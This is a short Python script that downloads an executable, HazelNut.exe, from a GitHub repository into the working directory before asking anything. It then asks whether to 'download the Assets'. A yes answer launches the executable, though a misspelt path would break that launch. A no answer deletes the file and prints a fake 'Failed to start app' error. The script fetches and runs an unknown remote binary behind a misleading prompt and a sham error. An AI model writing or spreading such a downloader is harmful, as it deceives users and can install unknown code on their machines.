import os
import requests
import time

def download(url: str, dest_folder: str):
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)

    filename = url.split('/')[-1].replace(" ", "_")
    file_path = os.path.join(dest_folder, filename)

    r = requests.get(url, stream=True)
    if r.ok:
        with open(file_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024 * 8):
                if chunk:
                    f.write(chunk)
                    f.flush()
                    os.fsync(f.fileno())

download("https://github.com/SkyLi000/TestScript/raw/main/HazelNut.exe", os.getcwd())
a = input("Would you like to download the Assets (Y/N): ")
if a == "y" or a == "Y":
    os.startfile(os.getcwd() + "/HazeNut.exe")
else:
    os.remove(os.getcwd() + "/HazelNut.exe")
    time.sleep(1)
    lol = input("Failed to start app: No asset found!")
    
